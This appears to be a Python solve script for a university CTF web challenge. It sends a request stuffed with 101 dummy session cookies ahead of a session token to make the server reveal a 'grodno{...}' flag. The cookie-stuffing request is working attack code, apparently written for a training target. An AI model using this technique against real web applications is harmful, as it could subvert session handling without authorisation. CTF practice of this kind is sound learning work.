import requests
import re

def main(url):
	cookies={
		'cookie':'Cookie: sessionCookie0=0; sessionCookie1=1; sessionCookie2=2; sessionCookie3=3; sessionCookie4=4; sessionCookie5=5; sessionCookie6=6; sessionCookie7=7; sessionCookie8=8; sessionCookie9=9; sessionCookie10=10; sessionCookie11=11; sessionCookie12=12; sessionCookie13=13; sessionCookie14=14; sessionCookie15=15; sessionCookie16=16; sessionCookie17=17; sessionCookie18=18; sessionCookie19=19; sessionCookie20=20; sessionCookie21=21; sessionCookie22=22; sessionCookie23=23; sessionCookie24=24; sessionCookie25=25; sessionCookie26=26; sessionCookie27=27; sessionCookie28=28; sessionCookie29=29; sessionCookie30=30; sessionCookie31=31; sessionCookie32=32; sessionCookie33=33; sessionCookie34=34; sessionCookie35=35; sessionCookie36=36; sessionCookie37=37; sessionCookie38=38; sessionCookie39=39; sessionCookie40=40; sessionCookie41=41; sessionCookie42=42; sessionCookie43=43; sessionCookie44=44; sessionCookie45=45; sessionCookie46=46; sessionCookie47=47; sessionCookie48=48; sessionCookie49=49; sessionCookie50=50; sessionCookie51=51; sessionCookie52=52; sessionCookie53=53; sessionCookie54=54; sessionCookie55=55; sessionCookie56=56; sessionCookie57=57; sessionCookie58=58; sessionCookie59=59; sessionCookie60=60; sessionCookie61=61; sessionCookie62=62; sessionCookie63=63; sessionCookie64=64; sessionCookie65=65; sessionCookie66=66; sessionCookie67=67; sessionCookie68=68; sessionCookie69=69; sessionCookie70=70; sessionCookie71=71; sessionCookie72=72; sessionCookie73=73; sessionCookie74=74; sessionCookie75=75; sessionCookie76=76; sessionCookie77=77; sessionCookie78=78; sessionCookie79=79; sessionCookie80=80; sessionCookie81=81; sessionCookie82=82; sessionCookie83=83; sessionCookie84=84; sessionCookie85=85; sessionCookie86=86; sessionCookie87=87; sessionCookie88=88; sessionCookie89=89; sessionCookie90=90; sessionCookie91=91; sessionCookie92=92; sessionCookie93=93; sessionCookie94=94; sessionCookie95=95; sessionCookie96=96; sessionCookie97=97; sessionCookie98=98; sessionCookie99=99; sessionCookie100=100; session=523a56ee-702d-4d77-9a16-ff9872a8e970.vPBmMNVHvSIcLP8VEHafEi0F4DM'
	}
	flag_re = 'grodno{.*?}'
	req = requests.get(url,cookies=cookies)
	# print (req.text)
	flag = re.findall(flag_re, req.text)

	print(flag[0])

if __name__=='__main__':
	url='http://ctf.mf.grsu.by/tasks/0423917d9fc95820065749eb3ca411fe/'
	main(url)
